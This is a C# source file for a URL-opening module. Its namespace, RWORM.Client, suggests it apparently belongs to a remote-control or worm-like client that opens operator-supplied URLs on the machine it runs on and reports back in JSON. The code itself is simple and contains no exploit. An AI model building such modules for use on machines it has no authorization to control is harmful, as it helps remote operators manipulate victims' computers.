using System;
using System.Diagnostics;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class UrlOpener
    {
        public static byte[] OpenUrl(string url)
        {
            if (string.IsNullOrWhiteSpace(url))
                return System.Text.Encoding.UTF8.GetBytes("{\"ok\":false,\"error\":\"Empty URL\"}");

            url = url.Trim();
            if (!url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
                !url.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                url = "https://" + url;
            }

            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                });
                return System.Text.Encoding.UTF8.GetBytes("{\"ok\":true}");
            }
            catch (Exception ex)
            {
                var err = JsonHelper.Escape(ex.Message);
                return System.Text.Encoding.UTF8.GetBytes($"{{\"ok\":false,\"error\":\"{err}\"}}");
            }
        }
    }
}
